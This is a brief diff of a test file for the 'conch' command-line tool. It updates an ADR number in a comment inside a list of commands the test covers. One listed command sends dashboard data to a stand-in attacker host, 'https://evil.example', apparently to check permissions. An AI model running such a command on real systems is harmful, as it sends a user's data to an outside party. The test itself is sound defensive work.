@@ -82,7 +82,7 @@ describe('`pnpm conch` powers that are the person’s to use', () => {
       'conch.exe reset',
       'conch --verbose hello',
       'pnpm conch -- open --link',
-      // Where Conch's numbers go, and who may read them (ADR 0119).
+      // Where Conch's numbers go, and who may read them (ADR 0121).
       'conch dashboards send custom --endpoint https://evil.example',
       'pnpm conch dashboards prometheus',
       'conch dashboards token',
